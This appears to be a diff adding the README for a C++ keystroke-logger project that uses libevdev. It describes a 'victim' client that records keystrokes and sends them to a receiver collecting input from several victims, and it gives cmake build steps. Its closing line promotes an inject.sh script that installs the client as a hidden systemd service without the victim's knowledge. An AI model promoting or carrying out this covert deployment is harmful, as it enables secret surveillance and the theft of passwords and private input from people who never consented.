@@ -1,0 +1,31 @@
+#+title: Keystroke logger
+
+* Introduction
+Keystroke logger is a software or hardware device used to record and monitor the keystrokes typed on a computer keyboard.
+Here we've create a simple keystrokes logger for your computer security project in c++ using the libevdev library.
+This program has 2 parts. One the client or the victim program which will be ran on the victim's machine and the other will be reciever program which will recieve and store the keystrokes of the different victims.
+
+* Instructions
+To comiple and run the client and reciever programs first clone this repository and follow these steps
+
+For client
+#+begin_src shell
+cd client/
+mkdir build
+cd build
+cmake ..
+make
+#+end_src
+
+For reciever
+#+begin_src shell
+cd reciever/
+mkdir build
+cd build
+cmake ..
+make
+#+end_src
+
+Now run the client program using ~./client~ and reciever using ~./reciever~
+
+You can also use the ~inject.sh~ script to automatically setup the client in victim's machine and run the client program in backgroud using systemd services without the victim's knowlegde.
